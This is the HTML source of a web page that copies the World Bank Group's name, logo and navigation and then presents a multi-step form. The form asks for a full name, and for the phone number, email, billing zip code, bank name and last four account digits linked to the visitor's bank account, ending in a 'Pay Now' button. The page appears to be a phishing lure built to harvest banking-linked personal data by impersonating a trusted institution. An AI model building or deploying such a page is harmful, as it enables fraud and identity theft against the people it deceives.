<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>World Bank Group - International Development, Poverty, & Sustainability</title>
    <link rel="shortcut icon" href="static/img/logos/wbg-favicon.png" type="image/png" />
    <link rel="stylesheet" href="static/css/style.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
</head>

<body>
    <section id="navigation-bar">
        <div class="container">
            <div id="first-nav">
                <div></div>
                <div class="first-child">
                    <a href="#">NEWS</a><span style="color:dimgrey;">|</span>
                    <a href="#">ENGLISH</a>
                </div>
            </div>
            <div id="second-nav">
                <img src="static/img/logos/wbglogo.svg" alt="World Bank Group">
                <div class="second-child">
                    <a href="#">WHO WE ARE</a>
                    <a href="#">WHAT WE DO</a>
                    <a href="#">WHERE WE WORK</a>
                    <a href="#">UNDERSTANDING POVERTY</a>
                    <a href="#">WORK WITH US</a>
                    <img src="https://www.worldbank.org/content/dam/sites/corporate/img/global/wblive-logo-ENG-short_white2.png"
                        class="nav-right" alt="">
                    <i class="bi bi-search nav-right"></i>
                </div>
                <div id="hidden-child">
                    <a href="#" class="hide-me">NEWS</a><span style="color:dimgrey;" class="hide-me">|</span>
                    <a href="#" class="hide-me">ENGLISH</a>
                    <i class="bi bi-list" data-bs-toggle="offcanvas" data-bs-target="#offcanvasRight"
                        aria-controls="offcanvasRight"></i>
                    <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasRight"
                        aria-labelledby="offcanvasRightLabel">
                        <div class="offcanvas-header">
                            <img src="static/img/logos/wbglogo.svg" alt="World Bank Group">
                            <button type="button" class="btn-close" data-bs-dismiss="offcanvas"
                                aria-label="Close"></button>
                        </div>
                        <div class="offcanvas-body">
                            <ul style="list-style-type:none;">
                                <li><a class="dropdown-item" href="#">WHO WE ARE</a></li>
                                <li><a class="dropdown-item" href="#">WHAT WE DO</a></li>
                                <li><a class="dropdown-item" href="#">WHERE WE WORK</a></li>
                                <li><a class="dropdown-item" href="#">UNDERSTANDING POVERTY</a></li>
                                <li><a class="dropdown-item" href="#">WORK WITH US</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <main>
        <div class="container text-center mt-5">
            <div class="row">
                <div class="col-md-12">
                    <form action="" method="post" class="form-field">
                        <div class="full-name">
                            <label for="fullName">Your Full Name With Middle Name<sup>*</sup></label>
                            <input type="text" name="fullName" id="fullName" placeholder="Type Full Name here..." required>
                            <div class="text-center"><button type="button" onclick="nameNext();" class="btn btn-primary nameNext">Next</button></div>
                        </div>
                        <div class="phone-num">
                            <label for="phoneNum">Phone Number associated with your bank account?<sup>*</sup></label>
                            <input type="text" name="phoneNum" id="phoneNum" placeholder="Type Phone Number here..." required>
                            <div class="text-center"><button type="button" onclick="phoneNext();" class="btn btn-primary">Next</button></div>
                        </div>
                        <div class="email-id">
                            <label for="emailId">Email Address associated with your bank account?<sup>*</sup></label>
                            <input type="text" name="emailId" id="emailId" placeholder="Type Email Address here..." required>
                            <div class="text-center"><button type="button" onclick="emailNext();" class="btn btn-primary">Next</button></div>
                        </div>
                        <div class="zip-code">
                            <label for="zipCode">Billing Zip code associated with your bank account?<sup>*</sup></label>
                            <input type="text" name="zipCode" id="zipCode" placeholder="Type Zip Code here..." required>
                            <div class="text-center"><button type="button" onclick="zipNext();" class="btn btn-primary">Next</button></div>
                        </div>
                        <div class="bank-name">
                            <label for="bankName">Enter the name of your bank<sup>*</sup></label>
                            <input type="text" name="bankName" id="bankName" placeholder="Type Bank Name here..." required>
                            <div class="text-center"><button type="button" onclick="bankNext();" class="btn btn-primary">Next</button></div>
                        </div>
                        <div class="acc-num">
                            <label for="accNum">Please enter the last 4 digit of your bank account<sup>*</sup></label>
                            <input type="text" name="accNum" id="accNum" placeholder="Type Last 4-digit of Account Number here..." required>
                            <div class="text-center"><button type="submit" class="btn btn-success">Pay Now</button></div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </main>
    <script src="static/js/script.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz"
        crossorigin="anonymous"></script>
</body>

</html>